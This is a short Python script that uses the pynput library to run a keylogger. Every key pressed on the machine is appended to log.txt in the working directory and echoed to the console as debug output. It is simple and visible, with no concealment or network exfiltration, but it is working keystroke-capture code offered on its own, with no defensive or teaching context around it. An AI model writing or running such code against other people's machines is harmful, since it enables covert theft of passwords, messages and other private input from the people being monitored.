from pynput import keyboard
import os

log_file = os.path.join(os.getcwd(), "log.txt")  # Save log in the current directory

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char'):  # Printable character
                f.write(key.char)
                print(f"Logged: {key.char}")  # Debugging
            else:  # Special key
                f.write(f" [{key}] ")
                print(f"Logged: [{key}]")  # Debugging
    except Exception as e:
        print(f"Error: {e}")

def start_keylogger():
    print(f"Logging keys... Logs saved in: {log_file}")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
